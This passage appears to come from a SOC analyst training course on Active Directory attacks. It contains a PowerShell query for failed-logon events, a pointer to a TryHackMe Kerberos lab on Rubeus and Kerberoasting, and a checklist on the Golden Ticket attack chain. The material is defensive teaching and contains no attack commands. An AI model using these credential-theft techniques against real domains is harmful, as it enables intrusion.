─────────────────────────────────────────────────
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4625
} -MaxEvents 20 |
Select-Object TimeCreated,
  @{N='Account';E={$_.Properties[5].Value}},
  @{N='Source IP';E={$_.Properties[19].Value}},
  @{N='Reason';E={$_.Properties[8].Value}} |
Format-Table -AutoSize

LAB 4 — TryHackMe: Attacking Kerberos (45 min)
Platform: TryHackMe.com
Room: Search "Attacking Kerberos"
Complete: Tasks 1, 2, 3
─────────────────────────────────────────────────
Focus on:
→ Task 1: Understanding Kerberos tickets
→ Task 2: Harvesting tickets with Rubeus
→ Task 3: Kerberoasting in practice
```

---

## ✅ DAY 2 COMPLETION CHECKLIST

```
THEORY:
□ Understand why DC01 stores hashes not passwords
□ Can explain Kerberos flow in own words (6 steps)
□ Know what LSASS is and why attackers target it
□ Understand all 4 attack types and how they chain
□ Know which Event IDs map to which attacks

LABS:
□ klist — viewed live Kerberos tickets
□ Created Gani's account via PowerShell
□ Queried Event ID 4625 via PowerShell
□ TryHackMe Attacking Kerberos — Tasks 1, 2, 3

READY FOR DAY 3 WHEN YOU CAN ANSWER:
□ Why must KRBTGT be reset TWICE to kill a Golden Ticket?
□ What makes gMSA better than a regular service account?
□ Explain the attack chain from phishing to Golden Ticket
   using SecureCorp as your example
```

---

> 💡 **Senior Architect's Note:** *"I've presented this attack chain to CISOs of Fortune 500 companies. The room goes silent when they realize a single phishing email to a new joinee — someone like Gani — can lead to complete domain compromise in 72 hours. Your job as a SOC Analyst is to be Navi — and catch this at Step 1. Everything we covered today is your weapon."*
---
